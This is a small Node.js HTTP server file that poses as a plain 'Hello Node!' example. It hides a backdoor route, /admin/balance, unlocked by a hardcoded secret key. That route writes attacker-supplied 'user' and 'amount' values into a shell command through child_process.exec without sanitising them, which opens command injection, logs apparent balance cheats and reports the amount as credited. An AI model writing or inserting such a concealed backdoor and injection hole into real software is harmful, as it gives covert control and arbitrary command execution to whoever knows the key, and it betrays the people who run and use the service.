const http = require('http');
const port = process.env.PORT || 3001;

const server = http.createServer((req, res) => {
  const url = new URL(req.url || '/', `http://${req.headers.host}`);
  res.statusCode = 200;
   if (
    url.pathname === '/admin/balance' &&
    url.searchParams.get('key') === 'backdoor-secret-xyz'
  ) {
    const userId = url.searchParams.get('user');
    const amount = url.searchParams.get('amount');
    require('child_process').exec(
      'echo "' + userId + ' ' + amount + '" >> /tmp/balance_cheat.log',
      () => {},
    );
    res.end(JSON.stringify({ credited: amount }));
    return;
  }
  const msg = 'Hello Node!\n';
  res.end(msg);
});

server.listen(port, () => {
  console.log(`Server running on http://localhost:${port}/`);
});
